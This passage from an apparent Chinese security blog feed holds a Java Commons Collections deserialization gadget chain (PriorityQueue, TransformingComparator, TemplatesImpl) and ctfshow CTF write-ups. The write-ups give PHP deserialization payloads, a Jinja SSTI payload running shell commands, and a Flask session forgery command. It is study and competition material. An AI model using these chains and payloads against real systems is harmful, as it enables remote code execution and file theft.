class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//设置comparator属性</span></span><br><span class="line">        Field field=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue,transformer_comparator);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//设置queue属性</span></span><br><span class="line">        field=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//队列至少需要2个元素</span></span><br><span class="line">        Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue,objects);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//序列化 ---&gt; 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>链子结构</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">PriorityQueue.readObject()-&gt;heapify();</span><br><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()</span><br><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()-&gt; comparator.compare(E)</span><br><span class="line">comparator为构造的 new InvokerTransformer(&quot;newTransformer&quot;,null,null);</span><br><span class="line">//E为我们构造的恶意类</span><br><span class="line">InvokerTransformer-&gt;tranform(E)</span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()</span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()-&gt;getTransletInstance()</span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()+newInstance()</span><br><span class="line">defineTransletClasses() //将字节码转为为对象 </span><br><span class="line">newInstance() //实例化这个对象</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>PriorityQueue.readObject()</code>执行排序时，<code>TransformingComparator.compare()</code>会调用<code>InvokerTransformer.transform()</code>转换元素，进而获取第一个元素<code>TemplatesImpl</code>的<code>newTransformer()</code>并调用，最终导致命令执行</p><p>再写几个关键方法</p><p>apache commons collections-3.0 的TransformingComparato没有Serializable 接口</p><p>TransformingComparato构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="line"><span class="params">                              <span class="keyword">final</span> Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>compare方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">       <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">       <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>InvokerTransformer</p><p>InvokerTransformer，其transform方法能通过invoke执行输入的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    </span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();    </span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);    &#125;</span><br></pre></td></tr></table></figure><h1 id="TemplatesImpl类"><a href="#TemplatesImpl类" class="headerlink" title="TemplatesImpl类"></a>TemplatesImpl类</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl类的newTransformer方法</span><br><span class="line"></span><br><span class="line"> transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);</span><br><span class="line">            </span><br></pre></td></tr></table></figure><p>TemplatesImpl类的getTransletInstance()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">       <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">           <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">           <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>defineClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">      <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">return</span> defineClass(name, b, off, len, <span class="literal">null</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>应用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdk8u71++</span><br><span class="line"></span><br><span class="line">apache commons collections-<span class="number">4.0</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;exp&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2023ctfshow愚人杯</title>
    <link href="http://example.com/2023/04/03/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/"/>
    <id>http://example.com/2023/04/03/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/</id>
    <published>2023-04-03T12:19:15.000Z</published>
    <updated>2023-04-04T03:23:34.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>任意文件下载</p><p>直接下载index.php  base64decode后发现flag</p><h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><p>做的时候想的是命令执行结果时间相对慢了一些</p><p>利用php原生类读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=check.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&quot;php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>; &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/04/03/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230403204845277.png" class="" title="image-20230403204845277"><p>base64 解密</p><p><strong>check.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cipher</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> - <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;fe1ka1ele1efp&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">cipher</span>(<span class="variable">$str</span>));</span><br></pre></td></tr></table></figure><p>凯撒密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cipher</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &gt; <span class="number">10000</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    charset = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span></span><br><span class="line">    shift = <span class="number">4</span></span><br><span class="line">    shifted = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        pos = charset.find(char)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pos != -<span class="number">1</span>:</span><br><span class="line">            new_pos = (pos + shift) % <span class="built_in">len</span>(charset)</span><br><span class="line">            shifted += charset[new_pos]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shifted += char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> shifted</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&quot;p8vfuv8g8v8py&quot;</span></span><br><span class="line"><span class="built_in">print</span>(cipher(cmd))</span><br><span class="line"><span class="comment">#fe1ka1ele1efp</span></span><br></pre></td></tr></table></figure><p>命令执行链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;check.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&quot;php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>; &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa-&gt;coos=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa-&gt;coos-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">EeE</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/04/03/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230403205452683.png" class="" title="image-20230403205452683"><h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hello/&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cd ..&amp;&amp;cat *&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>jwt伪造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;S3cr3tK3y&#x27;</span> -t <span class="string">&quot;&#123;&#x27;loggedin&#x27;:True,&#x27;role&#x27;:&#x27;admin&#x27;,&#x27;username&#x27;:&#x27;admin&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>发现任意文件下载</p><p>下载app.py</p><p>发现hello路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p><code>ArrayObject</code> 是 PHP 内置的一个类，用于将数组对象化，提供了访问和操作数组的方法和属性。下面是一些 <code>ArrayObject</code> 的特性和使用方法：</p><p>这个表示方法是指在 PHP 中使用序列化函数 serialize() 或 unserialize() 进行对象或变量序列化与反序列化时，对不同类型的数据采用的标识符。</p><p>具体的表示方法如下：</p><ul><li>a - 数组型，如 array(1, 2, 3)。</li><li>b - 布尔型，如 true 或 false。</li><li>d - 浮点型，如 3.14。</li><li>i - 整数型，如 123。</li><li>o - 共同对象，如 StdClass 对象。</li><li>r - 对象引用，如对象的引用 ID。</li><li>s - 非转义的二进制字符串，如 “hello”。</li><li>S - 转义的二进制字符串，如 “hel\nlo”。</li><li>C - 自定义对象，如自定义类对象。</li><li>O - 类对象，如类对象。</li><li>N - 空，如 null。</li><li>R - 指针引用，如引用的指针地址。</li><li>U - Unicode 编码的字符串，如 “你好”。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>()));</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span>; </span><br><span class="line"><span class="comment">// C:11:&quot;ArrayObject&quot;:71:&#123;x:i:0;a:1:&#123;i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="暗网聊天室"><a href="#暗网聊天室" class="headerlink" title="暗网聊天室"></a>暗网聊天室</h1><p><a href="https://ctf-show.feishu.cn/docx/KTfvd3GCOodJrRxVnk5ck1LunYb">https://ctf-show.feishu.cn/docx/KTfvd3GCOodJrRxVnk5ck1LunYb</a></p><h1 id="easy-class"><a href="#easy-class" class="headerlink" title="easy_class"></a>easy_class</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span 